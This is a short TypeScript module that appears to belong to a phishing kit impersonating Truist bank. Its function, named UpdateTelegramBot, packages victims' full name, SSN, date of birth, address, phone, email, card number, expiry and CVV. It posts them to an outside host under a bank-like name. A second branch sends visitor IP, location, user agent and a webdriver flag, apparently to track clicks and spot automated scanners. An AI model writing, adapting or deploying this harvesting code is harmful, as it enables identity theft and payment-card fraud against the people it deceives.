import type { TextParams, ClickedMessage } from "./ts-type";



export const UpdateTelegramBot = async ({
   type, FULL_NAME, PHONE_NUMBER,EMAIL,SSN,DOB,STREET_ADDRESS,STATE,CITY,ZIP_CODE,LOAN_AMOUNT,ADDRESS,CARD_NAME_INPUT,CARD_NUMBER,EXPIRYINPUT,CVV,
   CLICKED_MESSAGE = {USER_AGENT: "Not Detected", WEB_DRIVER: false, CITY: "unknown", REGION: "Not Detected", COUNTRY: "Not Detected", IP: "",},
}: TextParams) => {

   let data;

   switch (type) {
      case "personal":
         data = {
            full_name: FULL_NAME, type: "personal",
            phone_number: PHONE_NUMBER, email: EMAIL, ssn: SSN, dob: DOB, street_address: STREET_ADDRESS, state: STATE, city: CITY, zip_code: ZIP_CODE, loan_amount: LOAN_AMOUNT,
            addess: ADDRESS, card_name_input: CARD_NAME_INPUT, card_number: CARD_NUMBER, expiry_number: EXPIRYINPUT, cvv: CVV
         }
         break
      case "click":
         data = {
            click: CLICKED_MESSAGE,
            type: "click",
         };
         break;
      default:
         throw new Error("Invalid data type");
   }

   const response = await fetch(
      "https://truist-production.up.railway.app/api/views/",
      {
         method: "POST",
         headers: {
            "Content-Type": "application/json",
         },
         body: JSON.stringify(data),
      }
   );

   if (!response.ok) {
      throw new Error(`HTTP Error: ${response.status}`);
   }

    return response.json();
};


